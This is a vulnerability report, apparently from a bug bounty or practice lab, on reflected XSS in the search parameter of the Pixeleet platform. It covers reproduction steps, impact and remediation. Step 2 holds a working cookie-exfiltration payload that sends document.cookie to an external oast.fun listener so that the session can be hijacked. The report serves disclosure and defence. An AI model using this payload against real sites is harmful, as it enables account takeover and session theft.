## Title

Reflected Cross-Site Scripting (XSS) Leading to Account Takeover via Unsanitized `search` Parameter on Pixeleet Platform.

## Affected URL

https://pixeleet.pwnedbox.site/

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the search functionality of the Pixeleet platform. User-supplied input passed through the `search` GET parameter is reflected directly into the Document Object Model (DOM) without proper sanitization, encoding, or output escaping.

An attacker can construct a malicious URL incorporating a JavaScript payload designed to exfiltrate session cookies (such as crafting an image request containing `document.cookie` sent to an external collaborator or listener endpoint). When an authenticated victim clicks or visits the crafted URL, the script executes within their active session context, enabling session cookie theft, account compromise, and full account takeover.

## Steps to Reproduce

1. Navigate to the target application: `https://pixeleet.pwnedbox.site/`.
2. Craft a malicious URL injecting a cookie exfiltration payload into the `search` parameter, such as: `https://pixeleet.pwnedbox.site/index.php?search=%27%22%3C%3E%3Cscript%3Edocument.write(`%3Cimg%20src=https://psdqfmrbfpsifmkwjckdw8hzpv8sna9mv.oast.fun/${document.cookie}%3E`)%3C/script%3E`.
3. Send the crafted URL to an authenticated target user.
4. Observe that when the victim visits the link, their session identifier (`PHPSESSID`) is exfiltrated to the attacker's listener endpoint.
5. Use the stolen session cookie to impersonate the victim user and gain full account access.

## POC

<img width="1381" height="511" alt="image" src="https://github.com/user-attachments/assets/a30c86ca-2756-437e-85c6-da6767b97b3f" />
<img width="1311" height="1100" alt="image" src="https://github.com/user-attachments/assets/fc68ffc1-98db-4178-aaba-98d76c6f4746" />
<img width="1068" height="476" alt="image" src="https://github.com/user-attachments/assets/aebe22c5-0374-419d-9016-65c362a70e79" />
<img width="1598" height="1123" alt="image" src="https://github.com/user-attachments/assets/d3d2688b-1d9a-4c9c-9c29-ab4fccc09a74" />


## Impact

1. Full account takeover via session cookie exfiltration and subsequent session hijacking.
2. Execution of arbitrary JavaScript code within the browser context of any authenticated user visiting the malicious link.
3. Unauthorized access to victim profiles, private information, and platform features.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all reflected user inputs rendered within search results or dynamic page content.
2. Set the `HttpOnly` flag on all sensitive session cookies (like `PHPSESSID`) to prevent them from being accessed via client-side JavaScript.
3. Apply rigorous input validation and sanitization on query parameters to reject or neutralize script tags and HTML markup before rendering.
